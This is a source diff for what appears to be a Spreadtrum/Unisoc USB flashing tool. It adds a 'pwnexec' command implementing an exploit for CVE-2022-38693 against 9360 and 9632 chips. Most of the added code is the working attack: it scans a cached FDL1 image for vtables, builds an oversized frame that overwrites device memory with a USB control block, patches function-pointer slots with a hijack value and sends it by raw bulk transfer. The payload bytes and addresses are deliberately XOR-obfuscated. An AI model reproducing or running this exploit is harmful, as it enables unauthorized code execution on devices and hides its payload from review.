@@ -100,6 +100,10 @@ uint32_t fdl1_addr_json = 0;
 uint32_t fdl2_addr_json = 0;
 int async = 1;
 
+// FDL1 image cached by the CLI (when sent to 0x65008000), used by `pwnexec`.
+uint8_t* g_fdl1_img = nullptr;
+size_t g_fdl1_img_size = 0;
+
 #if USE_LIBUSB
 libusb_device** ports = nullptr;
 #else
@@ -2452,14 +2456,14 @@ void load_merged_nv(spdio_t* io, const char* name, const uint8_t* data, size_t s
     }
     load_nv_partition(io, name, merged.c_str(), step);
 }
-
+bool showCanceled = true;
 void signal_handler(int sig)
 {
     (void)sig;
     //Cancallation handler
     isCancel = 1;
     signal(SIGINT, SIG_DFL);
-    DBG_LOG("\nCancelled.\n");
+    if (showCanceled) DBG_LOG("\nCancelled.\n");
 }
 
 double get_time()
@@ -4571,5 +4575,350 @@ void w_force_self_repair(spdio_t* io, int CMethod)
     partition_t* table = CMethod ? io->Cptable : io->ptable;
     int count = CMethod ? io->part_count_c : io->part_count;
     w_force_commit_table(io, table, count);
+}
+
+// ---- CVE-2022-38693 (pwnexec) ------------------------------------------
+// Payload tables, anchor and layout constants are stored obfuscated and are
+// rebuilt in memory right before use.
+namespace {
+volatile uint8_t pwn_seed = 0x5B;
+volatile uint32_t pwn_seed32 = 0xA5C39E71u;
+
+inline uint8_t pwn_k(size_t i)
+{
+    return (uint8_t)(pwn_seed + (uint8_t)(i * 0x1D));
+}
+
+inline uint32_t pwn_d32(uint32_t v)
+{
+    return v ^ pwn_seed32;
+}
+
+inline void pwn_dbuf(uint8_t* dst, const uint8_t* src, size_t n)
+{
+    for (size_t i = 0; i < n; i++)
+        dst[i] = (uint8_t)(src[i] ^ pwn_k(i));
+}
+}
+
+static const uint8_t pwn_blob_a[] = {
+    0x5b, 0x78, 0x95, 0xb2, 0xcf, 0xec, 0x09, 0x26, 0x53, 0x60, 0x7d, 0x9a, 0xa7, 0xd4, 0xf1, 0x0e,
+    0x2b, 0x48, 0x65, 0x82, 0x9f, 0xbc, 0xd9, 0xf6, 0x13, 0x30, 0x4d, 0x6a, 0x87, 0xa4, 0xc1, 0xde,
+    0x7b, 0x70, 0x35, 0x37, 0x4f, 0x8c, 0xa9, 0xd6, 0xe6, 0x00, 0x1d, 0x3a, 0x57, 0x74, 0x91, 0xae,
+    0xdf, 0x17, 0x8b, 0xa2, 0x1f, 0x5c, 0x71, 0x96, 0xb6, 0xd0, 0xed, 0x0a, 0x27, 0x44, 0x61, 0x7e,
+    0x1b, 0xd0, 0xd5, 0x97, 0x0f, 0x2c, 0x49, 0x66, 0x83, 0xb0, 0x9d, 0xda, 0xf1, 0x15, 0x31, 0x4f,
+    0x7f, 0x77, 0x2b, 0x42, 0xdf, 0xfc, 0x19, 0x36, 0x5b, 0x70, 0xad, 0xaa, 0xc2, 0xe5, 0x01, 0x1f
+};
+
+static const uint8_t pwn_blob_b[] = {
+    0x5b, 0x78, 0x95, 0xb2, 0xcf, 0xec, 0x09, 0x26, 0x53, 0x60, 0x7d, 0x9a, 0xa7, 0xd4, 0xf1, 0x0e,
+    0x2b, 0x48, 0x65, 0x82, 0x9f, 0xbc, 0xd9, 0xf6, 0x13, 0x30, 0x4d, 0x6a, 0x87, 0xa4, 0xc1, 0xde,
+    0x7b, 0x5c, 0x35, 0x37, 0x4f, 0x8c, 0xa9, 0xd6, 0xe6, 0x00, 0x1d, 0x3a, 0x57, 0x74, 0x91, 0xae,
+    0xdf, 0x17, 0x8b, 0xa2, 0x1f, 0x5c, 0x71, 0x96, 0xb6, 0xd0, 0xed, 0x0a, 0x27, 0x44, 0x61, 0x7e,
+    0x1b, 0xfc, 0xd5, 0x97, 0x0f, 0x2c, 0x49, 0x66, 0x83, 0xb0, 0x9d, 0xda, 0xf1, 0x15, 0x31, 0x4f,
+    0x7f, 0x77, 0x2b, 0x42, 0xdf, 0xfc, 0x19, 0x36, 0x5b, 0x70, 0xad, 0xaa, 0xc2, 0xe5, 0x01, 0x1f
+};
+
+static const uint8_t pwn_anchor[] = {
+    0x09, 0x37, 0xd8, 0xf1, 0x80, 0xa8, 0x4c
+};
+
+typedef struct {
+    const char* n;
+    uint32_t a, b, c, e;
+    const uint8_t* blob;
+    unsigned blob_n;
+} pwn_desc_t;
+
+static const pwn_desc_t pwn_desc[] = {
+    { "9360", 0xC0C3ADEDu, 0xC0C31E71u, 0xC0C3C5B1u, 0x1BC39E71u, pwn_blob_a, sizeof(pwn_blob_a) },
+    { "9632", 0xC0C391EDu, 0xC0C31E71u, 0xC0C3A9B1u, 0x1BC39E71u, pwn_blob_b, sizeof(pwn_blob_b) },
+};
+
+static int pwn_scan_a(const uint8_t* img, size_t size, uint32_t img_base,
+                      uint32_t* tbl_out)
+{
+    uint8_t anchor[sizeof(pwn_anchor)];
+    const size_t alen = sizeof(anchor);
+    size_t i;
+    pwn_dbuf(anchor, pwn_anchor, alen);
+    for (i = 0; i + alen <= size; i += 8)
+    {
+        size_t p;
+        if (memcmp(img + i, anchor, alen)) continue;
+        if (i < 8) continue;
+        p = i - 8;
+        while (p >= 8)
+        {
+            uint32_t v, hi;
+            memcpy(&v, img + p - 8, 4);
+            memcpy(&hi, img + p - 4, 4);
+            if (hi || v < img_base || v >= img_base + size) break;
+            p -= 8;
+        }
+        *tbl_out = img_base + (uint32_t)p;
+        DBG_LOG("pwnexec: usb vtable 0x%x", (unsigned)*tbl_out);
+        return 1;
+    }
+    return 0;
+}
+
+static int pwn_check_b(const uint8_t* img, size_t size, uint32_t img_base, size_t off, int n)
+{
+    int i;
+    for (i = 0; i < n; i++)
+    {
+        uint32_t v, hi;
+        if (off + (size_t)i * 8 + 8 > size) return 0;
+        memcpy(&v, img + off + (size_t)i * 8, 4);
+        memcpy(&hi, img + off + (size_t)i * 8 + 4, 4);
+        if (hi || v < img_base || v >= img_base + size) return 0;
+    }
+    return 1;
+}
+
+static int pwn_scan_c(const uint8_t* img, size_t size, uint32_t img_base,
+                                uint32_t usb_first, uint32_t* out, int max_out)
+{
+    uint32_t first;
+    size_t off, off2;
+    int n = 0;
+    for (off = 0; off + 0x40 <= size && n + 2 <= max_out; off += 8)
+    {
+        if (!pwn_check_b(img, size, img_base, off, 8)) continue;
+        if (off >= 8 && pwn_check_b(img, size, img_base, off - 8, 8)) continue;
+        memcpy(&first, img + off, 4);
+        if (first >= usb_first) continue;
+        for (off2 = off + 8; off2 + 0x40 <= size; off2 += 8)
+            if (!memcmp(img + off, img + off2, 0x40)) break;
+        if (off2 + 0x40 > size) continue;
+        out[n++] = img_base + (uint32_t)off;
+        out[n++] = img_base + (uint32_t)off2;
+        DBG_LOG("pwnexec: uart vtable 0x%x (twin 0x%x)",
+                (unsigned)out[n - 2], (unsigned)out[n - 1]);
+    }
+    return n;
+}
+
+// Raw bulk write, bypassing HDLC/BSL framing. len == 0 sends a ZLP.
+static int pwn_write_d(spdio_t* io, uint8_t* buf, unsigned len)
+{
+#if USE_LIBUSB
+    int sent = 0;
+    int err = libusb_bulk_transfer(io->dev_handle, io->endp_out,
+                                   len ? buf : nullptr, (int)len, &sent, io->timeout);
+    if (err < 0)
+    {
+        DBG_LOG("bulk transfer failed: %s", libusb_error_name(err));
+        return -1;
+    }
+    return sent == (int)len ? 0 : -1;
+#else
+    if (!len) return 0;
+    return call_Write(io->handle, buf, (int)len) == (int)len ? 0 : -1;
+#endif
+}
+
+int jack_fdl1(spdio_t* io, const char* img_fn, const char* platform)
+{
+    uint8_t *img = nullptr, *file_img = nullptr, *payload = nullptr, *enc = nullptr;
+    uint8_t end_byte = HDLC_HEADER;
+    size_t img_size = 0, len, poff, nblocks = 0, blk = 0, keep = 0, scan_size;
+    const pwn_desc_t* L = nullptr;
+    uint32_t dst_addr, img_addr, usb_ctrl_addr, patch_at[10];
+    uint32_t usb_tbl = 0, usb_first = 0, uart_tbls[4] = {0};
+    int npatch = 0, k, nu, i;
+    uint64_t hijack_val;
+    size_t win;
+    unsigned chunk = 512; // chunk <= 768
+    unsigned long long time0;
+
+    if (!io || !platform) return 0;
+
+    int np = (int)(sizeof(pwn_desc) / sizeof(pwn_desc[0]));
+    for (k = 0; k < np; k++)
+        if (!strcmp(pwn_desc[k].n, platform)) break;
+    if (k == np)
+    {
+        DBG_LOG("pwnexec: unknown platform %s (supported: 9360, 9632)", platform);
+        return 0;
+    }
+    L = &pwn_desc[k];
+
+    dst_addr = pwn_d32(L->a);
+    img_addr = pwn_d32(L->b);
+    usb_ctrl_addr = pwn_d32(L->c);
+    hijack_val = (uint64_t)pwn_d32(L->e);
+    win = (size_t)pwn_d32(0xA5C22671u);
+    DBG_LOG("pwnexec: platform %s: dst 0x%x, image base 0x%x, usb ctrl 0x%x",
+            L->n, (unsigned)dst_addr, (unsigned)img_addr, (unsigned)usb_ctrl_addr);
+
+    if (img_fn)
+    {
+        size_t n = 0;
+        file_img = loadfile(img_fn, &n, 0);
+        if (!file_img)
+        {
+            DBG_LOG("pwnexec: failed to load %s", img_fn);
+            return 0;
+        }
+        img = file_img;
+        img_size = n;
+    }
+    else
+    {
+        img = g_fdl1_img;
+        img_size = g_fdl1_img_size;
+        if (!img)
+        {
+            DBG_LOG("pwnexec: no cached FDL1 image, send it first or use pwnexecd");
+            return 0;
+        }
+    }
+
+    if (!img_size || img_addr <= dst_addr)
+    {
+        DBG_LOG("pwnexec: invalid FDL1 image");
+        if (file_img) delete[](file_img);
+        return 0;
+    }
+
+    scan_size = img_size < win ? img_size : win;
+    if (!pwn_scan_a(img, scan_size, img_addr, &usb_tbl))
+    {
+        DBG_LOG("pwnexec: anchor not found");
+        if (file_img) delete[](file_img);
+        return 0;
+    }
+    if ((size_t)(usb_tbl - img_addr) + 4 > img_size)
+    {
+        DBG_LOG("pwnexec: usb vtable outside image");
+        if (file_img) delete[](file_img);
+        return 0;
+    }
+    memcpy(&usb_first, img + (usb_tbl - img_addr), 4);
+    patch_at[npatch++] = usb_tbl + 8;
+    nu = pwn_scan_c(img, scan_size, img_addr, usb_first, uart_tbls, 4);
+    for (i = 0; i < nu && npatch < (int)(sizeof(patch_at) / sizeof(patch_at[0])); i++)
+        patch_at[npatch++] = uart_tbls[i] + 0x18;
+    DBG_LOG("pwnexec: %d hijack slot(s) will be patched", npatch);
+
+    len = (size_t)(img_addr - dst_addr) + win;
+    payload = (uint8_t*)calloc(1, len);
+    if (!payload) ERR_EXIT("malloc failed\n");
+    keep = img_size < win ? img_size : win;
+    memcpy(payload + (img_addr - dst_addr), img, keep);
+
+    DBG_LOG("pwnexec: image %s, %u bytes (0..0x%x)",
+            img_fn ? img_fn : "<cached>", (unsigned)img_size, (unsigned)(img_size - 1));
+    DBG_LOG("pwnexec: frame = 0x7e + %u bytes + 0x7e, written to 0x%x..0x%x",
+            (unsigned)len, (unsigned)dst_addr, (unsigned)(dst_addr + len - 1));
+    DBG_LOG("pwnexec:   0x%x..0x%x <- fill 0x00 (%u bytes)",
+            (unsigned)dst_addr, (unsigned)(img_addr - 1), (unsigned)(img_addr - dst_addr));
+    DBG_LOG("pwnexec:   0x%x..0x%x <- image",
+            (unsigned)img_addr, (unsigned)(dst_addr + len - 1));
+
+    // The image has been copied into the payload, so the cached copy can go.
+    if (file_img) delete[](file_img);
+    else
+    {
+        delete[](g_fdl1_img);
+        g_fdl1_img = nullptr;
+        g_fdl1_img_size = 0;
+    }
+
+    uint8_t ctrl[sizeof(pwn_blob_a)];
+    if (L->blob_n > sizeof(ctrl))
+    {
+        DBG_LOG("pwnexec: invalid ctrl descriptor");
+        free(payload);
+        return 0;
+    }
+    pwn_dbuf(ctrl, L->blob, L->blob_n);
+    size_t off = (size_t)(usb_ctrl_addr - dst_addr);
+    if (off + L->blob_n > len)
+    {
+        DBG_LOG("pwnexec: usb ctrl block outside payload");
+        free(payload);
+        return 0;
+    }
+    memcpy(payload + off, ctrl, L->blob_n);
+    DBG_LOG("pwnexec:   0x%x..0x%x <- USB ctrl/desc (%s dump, %u bytes)",
+            (unsigned)usb_ctrl_addr,
+            (unsigned)(usb_ctrl_addr + L->blob_n - 1),
+            L->n, L->blob_n);
+
+    for (k = 0; k < npatch; k++)
+    {
+        uint64_t val = hijack_val;
+        size_t poff_patch;
+        if (patch_at[k] < dst_addr)
+        {
+            DBG_LOG("pwnexec: patch slot 0x%x below payload", (unsigned)patch_at[k]);
+            free(payload);
+            return 0;
+        }
+        poff_patch = (size_t)(patch_at[k] - dst_addr);
+        if (poff_patch + 8 > len)
+        {
+            DBG_LOG("pwnexec: patch slot 0x%x outside payload", (unsigned)patch_at[k]);
+            free(payload);
+            return 0;
+        }
+        memcpy(payload + poff_patch, &val, 8);
+        DBG_LOG("pwnexec:   [0x%x] = 0x%llx bytes ",
+                (unsigned)patch_at[k], (unsigned long long)hijack_val);
+        print_mem(stderr, payload + poff_patch, 8);
+    }
+
+    enc = (uint8_t*)malloc((size_t)chunk * 2 + 2);
+    if (!enc)
+    {
+        free(payload);
+        ERR_EXIT("malloc failed\n");
+    }
+
+    time0 = GetTickCount64();
+    if (pwn_write_d(io, &end_byte, 1)) ERR_EXIT("usb_send failed (frame head)\n");
+    for (poff = 0; poff < len;)
+    {
+        int n = spd_transcode_max(payload + poff, (int)(len - poff), (int)chunk);
+        int e = spd_transcode(enc, payload + poff, n);
+        nblocks++;
+        blk++;
+        if (pwn_write_d(io, enc, (unsigned)e))
+        {
+            DBG_LOG("\npwnexec: FAILED at block %u: payload 0x%x..0x%x -> device 0x%x..0x%x, wire %d",
+                    (unsigned)blk, (unsigned)poff, (unsigned)(poff + n - 1),
+                    (unsigned)(dst_addr + poff), (unsigned)(dst_addr + poff + n - 1), e);
+            DBG_LOG("pwnexec: delivered %u/0x%x payload bytes in %llums,"
+                    " last device byte written: 0x%x",
+                    (unsigned)poff, (unsigned)len,
+                    GetTickCount64() - time0, (unsigned)(dst_addr + poff - 1));
+            ERR_EXIT("usb_send failed\n");
+        }
+#if USE_LIBUSB
+        if (io->endp_out_blk > 0 && !((unsigned)e % io->endp_out_blk))
+        {
+            if (pwn_write_d(io, nullptr, 0))
+                ERR_EXIT("usb_send (zlp) failed at payload 0x%x\n", (unsigned)poff);
+        }
+#endif
+        poff += n;
+        if (io->verbose >= 1)
+            DBG_LOG("pwnexec: device 0x%x..0x%x",
+                    (unsigned)(dst_addr + poff - n), (unsigned)(dst_addr + poff - 1));
+        else
+            print_progress_bar(io, poff, len, time0);
+        usleep(1000);
+    }
+    if (pwn_write_d(io, &end_byte, 1)) ERR_EXIT("usb_send failed (frame tail)\n");
+    if (io->verbose < 1) print_progress_bar(io, len, len, time0);
+    unsigned long long ms = GetTickCount64() - time0 + 1;
+    DBG_LOG("\npwnexec: frame sent: %u payload bytes, %u blocks, %llums (%.0f KB/s)",
+            (unsigned)len, (unsigned)nblocks, ms, (double)len / (double)ms);
+    free(enc);
+    free(payload);
+    return 1;
 }
 
